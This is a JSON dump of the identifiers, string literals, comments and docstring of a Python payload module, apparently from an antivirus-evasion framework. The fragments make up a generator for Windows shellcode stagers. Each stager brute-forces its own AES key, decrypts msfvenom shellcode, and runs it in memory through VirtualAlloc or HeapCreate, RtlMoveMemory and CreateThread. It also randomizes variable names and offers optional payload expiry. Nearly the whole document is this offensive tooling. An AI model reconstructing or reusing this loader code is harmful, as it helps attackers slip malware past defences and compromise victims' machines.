{
    "identifiers": [
        "datetime",
        "date",
        "datetime",
        "timedelta",
        "modules",
        "common",
        "shellcode",
        "modules",
        "common",
        "helpers",
        "modules",
        "common",
        "encryption",
        "shellcode",
        "Shellcode",
        "required_options",
        "lower",
        "required_options",
        "lower",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "RandShellCode",
        "RandDecodedShellcode",
        "PayloadCode",
        "RandPtr",
        "RandShellCode",
        "PayloadCode",
        "RandBuf",
        "RandShellCode",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "RandBuf",
        "RandShellCode",
        "PayloadCode",
        "RandHt",
        "RandPtr",
        "PayloadCode",
        "RandHt",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode",
        "date",
        "today",
        "todaysdate",
        "timedelta",
        "days",
        "required_options",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "RandToday",
        "PayloadCode",
        "RandExpire",
        "expiredate",
        "PayloadCode",
        "RandToday",
        "RandExpire",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "RandShellCode",
        "RandDecodedShellcode",
        "PayloadCode",
        "RandPtr",
        "RandShellCode",
        "PayloadCode",
        "RandBuf",
        "RandShellCode",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "RandBuf",
        "RandShellCode",
        "PayloadCode",
        "RandHt",
        "RandPtr",
        "PayloadCode",
        "RandHt",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode",
        "required_options",
        "lower",
        "required_options",
        "lower",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "RandShellCode",
        "RandDecodedShellcode",
        "PayloadCode",
        "HeapVar",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "HeapVar",
        "RandShellCode",
        "PayloadCode",
        "RandBuf",
        "RandShellCode",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "RandBuf",
        "RandShellCode",
        "PayloadCode",
        "RandHt",
        "RandPtr",
        "PayloadCode",
        "RandHt",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode",
        "date",
        "today",
        "todaysdate",
        "timedelta",
        "days",
        "required_options",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "RandToday",
        "PayloadCode",
        "RandExpire",
        "expiredate",
        "PayloadCode",
        "RandToday",
        "RandExpire",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "RandShellCode",
        "RandDecodedShellcode",
        "PayloadCode",
        "HeapVar",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "HeapVar",
        "RandShellCode",
        "PayloadCode",
        "RandBuf",
        "RandShellCode",
        "RandShellCode",
        "PayloadCode",
        "RandPtr",
        "RandBuf",
        "RandShellCode",
        "PayloadCode",
        "RandHt",
        "RandPtr",
        "PayloadCode",
        "RandHt",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode",
        "required_options",
        "lower",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "ShellcodeVariableName",
        "RandDecodedShellcode",
        "PayloadCode",
        "RandMemoryShell",
        "ShellcodeVariableName",
        "ShellcodeVariableName",
        "PayloadCode",
        "RandShellcode",
        "RandMemoryShell",
        "PayloadCode",
        "RandShellcode",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode",
        "date",
        "today",
        "todaysdate",
        "timedelta",
        "days",
        "required_options",
        "shellcode",
        "generate",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "helpers",
        "randomString",
        "encryption",
        "constrainedAES",
        "Shellcode",
        "encryption",
        "knownPlaintext",
        "secret",
        "known_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "PayloadCode",
        "RandToday",
        "PayloadCode",
        "RandExpire",
        "expiredate",
        "PayloadCode",
        "RandToday",
        "RandExpire",
        "PayloadCode",
        "small_constrained_key_variable",
        "partial_key",
        "PayloadCode",
        "RandPadding",
        "PayloadCode",
        "RandDecodeAES",
        "RandPadding",
        "PayloadCode",
        "key_guess",
        "PayloadCode",
        "secret_key",
        "small_constrained_key_variable",
        "key_guess",
        "PayloadCode",
        "RandCipherObject",
        "secret_key",
        "PayloadCode",
        "plaintext_string_variable",
        "RandDecodeAES",
        "RandCipherObject",
        "encrypted_plaintext_string",
        "PayloadCode",
        "plaintext_string_variable",
        "known_plaintext_string",
        "PayloadCode",
        "RandDecodedShellcode",
        "RandDecodeAES",
        "RandCipherObject",
        "EncodedShellcode",
        "PayloadCode",
        "ShellcodeVariableName",
        "RandDecodedShellcode",
        "PayloadCode",
        "RandMemoryShell",
        "ShellcodeVariableName",
        "ShellcodeVariableName",
        "PayloadCode",
        "RandShellcode",
        "RandMemoryShell",
        "PayloadCode",
        "RandShellcode",
        "required_options",
        "lower",
        "encryption",
        "pyherion",
        "PayloadCode",
        "PayloadCode"
    ],
    "literals": [
        "\"AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed\"",
        "\"python\"",
        "\"py\"",
        "\"Excellent\"",
        "\"compile_to_exe\"",
        "\"Y\"",
        "\"Compile to an executable\"",
        "\"use_pyherion\"",
        "\"N\"",
        "\"Use the pyherion encrypter\"",
        "\"inject_method\"",
        "\"Virtual\"",
        "\"Virtual, Void, Heap\"",
        "\"expire_payload\"",
        "\"X\"",
        "\"Optional: Payloads expire after \\\"X\\\" days\"",
        "\"inject_method\"",
        "\"virtual\"",
        "\"expire_payload\"",
        "\"x\"",
        "'import ctypes\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "' = \\''",
        "'\\'\\n'",
        "' = \\'{\\'\\n'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'for '",
        "' in range(100000, 1000000):\\n'",
        "'\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t'",
        "' = bytearray('",
        "'.decode(\"string_escape\"))\\n'",
        "'\\t\\t'",
        "' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('",
        "')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\\n'",
        "'\\t\\t'",
        "' = (ctypes.c_char * len('",
        "')).from_buffer('",
        "')\\n'",
        "'\\t\\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int('",
        "'),'",
        "',ctypes.c_int(len('",
        "')))\\n'",
        "'\\t\\t'",
        "' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int('",
        "'),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\\n'",
        "'\\t\\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int('",
        "'),ctypes.c_int(-1))\\n'",
        "\"use_pyherion\"",
        "\"y\"",
        "\"expire_payload\"",
        "'import ctypes\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "'from datetime import datetime\\n'",
        "'from datetime import date\\n\\n'",
        "' = datetime.now()\\n'",
        "' = datetime.strptime(\\\"'",
        "'\\\",\\\"%y-%m-%d\\\") \\n'",
        "'if '",
        "' < '",
        "':\\n'",
        "'\\t'",
        "' = \\''",
        "'\\'\\n'",
        "'\\t'",
        "' = \\'{\\'\\n'",
        "'\\t'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'\\tfor '",
        "' in range(100000, 1000000):\\n'",
        "'\\t\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t\\t'",
        "' = bytearray('",
        "'.decode(\"string_escape\"))\\n'",
        "'\\t\\t\\t'",
        "' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('",
        "')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\\n'",
        "'\\t\\t\\t'",
        "' = (ctypes.c_char * len('",
        "')).from_buffer('",
        "')\\n'",
        "'\\t\\t\\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int('",
        "'),'",
        "',ctypes.c_int(len('",
        "')))\\n'",
        "'\\t\\t\\t'",
        "' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int('",
        "'),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\\n'",
        "'\\t\\t\\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int('",
        "'),ctypes.c_int(-1))\\n'",
        "\"use_pyherion\"",
        "\"y\"",
        "\"inject_method\"",
        "\"heap\"",
        "\"expire_payload\"",
        "\"x\"",
        "'import ctypes\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "' = \\''",
        "'\\'\\n'",
        "' = \\'{\\'\\n'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'for '",
        "' in range(100000, 1000000):\\n'",
        "'\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t'",
        "' = bytearray('",
        "'.decode(\"string_escape\"))\\n'",
        "'\\t\\t'",
        "' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len('",
        "') * 2),ctypes.c_int(0))\\n'",
        "'\\t\\t'",
        "' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int('",
        "'),ctypes.c_int(0x00000008),ctypes.c_int(len( '",
        "')))\\n'",
        "'\\t\\t'",
        "' = (ctypes.c_char * len('",
        "')).from_buffer('",
        "')\\n'",
        "'\\t\\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int('",
        "'),'",
        "',ctypes.c_int(len('",
        "')))\\n'",
        "'\\t\\t'",
        "' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int('",
        "'),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\\n'",
        "'\\t\\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int('",
        "'),ctypes.c_int(-1))\\n'",
        "\"use_pyherion\"",
        "\"y\"",
        "\"expire_payload\"",
        "'import ctypes\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "'from datetime import datetime\\n'",
        "'from datetime import date\\n\\n'",
        "' = datetime.now()\\n'",
        "' = datetime.strptime(\\\"'",
        "'\\\",\\\"%y-%m-%d\\\") \\n'",
        "'if '",
        "' < '",
        "':\\n'",
        "'\\t'",
        "' = \\''",
        "'\\'\\n'",
        "'\\t'",
        "' = \\'{\\'\\n'",
        "'\\t'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'\\tfor '",
        "' in range(100000, 1000000):\\n'",
        "'\\t\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t\\t'",
        "' = bytearray('",
        "'.decode(\"string_escape\"))\\n'",
        "'\\t\\t\\t'",
        "' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len('",
        "') * 2),ctypes.c_int(0))\\n'",
        "'\\t\\t\\t'",
        "' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int('",
        "'),ctypes.c_int(0x00000008),ctypes.c_int(len( '",
        "')))\\n'",
        "'\\t\\t\\t'",
        "' = (ctypes.c_char * len('",
        "')).from_buffer('",
        "')\\n'",
        "'\\t\\t\\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int('",
        "'),'",
        "',ctypes.c_int(len('",
        "')))\\n'",
        "'\\t\\t\\t'",
        "' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int('",
        "'),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\\n'",
        "'\\t\\t\\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int('",
        "'),ctypes.c_int(-1))\\n'",
        "\"use_pyherion\"",
        "\"y\"",
        "\"expire_payload\"",
        "\"x\"",
        "'from ctypes import *\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "' = \\''",
        "'\\'\\n'",
        "' = \\'{\\'\\n'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'for '",
        "' in range(100000, 1000000):\\n'",
        "'\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t'",
        "' = '",
        "'.decode(\"string_escape\")\\n'",
        "'\\t\\t'",
        "' = create_string_buffer('",
        "', len('",
        "'))\\n'",
        "'\\t\\t'",
        "' = cast('",
        "', CFUNCTYPE(c_void_p))\\n'",
        "'\\t\\t'",
        "'()'",
        "\"use_pyherion\"",
        "\"y\"",
        "\"expire_payload\"",
        "'from ctypes import *\\n'",
        "'from Crypto.Cipher import AES\\n'",
        "'import base64\\n'",
        "'import os\\n'",
        "'from datetime import datetime\\n'",
        "'from datetime import date\\n\\n'",
        "' = datetime.now()\\n'",
        "' = datetime.strptime(\\\"'",
        "'\\\",\\\"%y-%m-%d\\\") \\n'",
        "'if '",
        "' < '",
        "':\\n'",
        "'\\t'",
        "' = \\''",
        "'\\'\\n'",
        "'\\t'",
        "' = \\'{\\'\\n'",
        "'\\t'",
        "' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('",
        "')\\n'",
        "'\\tfor '",
        "' in range(100000, 1000000):\\n'",
        "'\\t\\t'",
        "\" = \"",
        "' + str('",
        "')\\n'",
        "'\\t\\t'",
        "' = AES.new('",
        "')\\n'",
        "'\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\tif '",
        "' == \\''",
        "'\\':\\n'",
        "'\\t\\t\\t'",
        "' = '",
        "'('",
        "', \\''",
        "'\\')\\n'",
        "'\\t\\t\\t'",
        "' = '",
        "'.decode(\"string_escape\")\\n'",
        "'\\t\\t\\t'",
        "' = create_string_buffer('",
        "', len('",
        "'))\\n'",
        "'\\t\\t\\t'",
        "' = cast('",
        "', CFUNCTYPE(c_void_p))\\n'",
        "'\\t\\t\\t'",
        "'()'",
        "\"use_pyherion\"",
        "\"y\""
    ],
    "variables": [
        "description",
        "language",
        "extension",
        "rating",
        "shellcode",
        "required_options",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "todaysdate",
        "expiredate",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "RandToday",
        "RandExpire",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "HeapVar",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "todaysdate",
        "expiredate",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "RandToday",
        "RandExpire",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "HeapVar",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "RandShellcode",
        "RandReverseShell",
        "RandMemoryShell",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode",
        "todaysdate",
        "expiredate",
        "Shellcode",
        "ShellcodeVariableName",
        "RandPtr",
        "RandBuf",
        "RandHt",
        "RandDecodeAES",
        "RandCipherObject",
        "RandDecodedShellcode",
        "RandShellCode",
        "RandPadding",
        "RandShellcode",
        "RandReverseShell",
        "RandMemoryShell",
        "RandToday",
        "RandExpire",
        "known_plaintext_string",
        "plaintext_string_variable",
        "key_guess",
        "secret_key",
        "small_constrained_key_variable",
        "EncodedShellcode",
        "partial_key",
        "secret",
        "encrypted_plaintext_string",
        "PayloadCode",
        "PayloadCode"
    ],
    "comments": [
        "required options",
        "options we require user interaction for- format is {Option : [Value, Description]]}",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code",
        "Get our current date and add number of days to the date",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code",
        "Get our current date and add number of days to the date",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code",
        "Get our current date and add number of days to the date",
        "Generate Shellcode Using msfvenom",
        "Generate Random Variable Names",
        "encrypt the shellcode and grab the randomized key",
        "Use the secret we received earlier to encrypt our known plaintext string",
        "Create Payload code"
    ],
    "docstrings": [
        "\"\"\"\n\nThis payload constains encrypted shellcode, but not key in the file.  The script\nbrute forces itself to find the key via a known-plaintext attack, decrypts the \nshellcode, and then executes it.\n\n\nBased off of CodeKoala which can be seen here:\nhttp://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/\nLooks like Dave Kennedy also used this code in SET\nhttps://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.\n\n\nmodule by @christruncer\n\n\"\"\""
    ],
    "functions": [
        "generate"
    ],
    "classes": [
        "Payload"
    ]
}